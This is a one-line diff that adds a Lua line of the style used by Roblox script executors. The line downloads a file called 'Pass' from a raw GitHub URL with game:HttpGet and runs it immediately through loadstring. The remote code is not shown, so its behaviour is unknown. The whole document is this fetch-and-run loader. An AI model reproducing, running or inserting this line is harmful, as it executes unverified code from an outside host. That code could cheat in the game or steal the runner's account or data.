@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joyaich5522-design/Main/refs/heads/main/Pass"))()
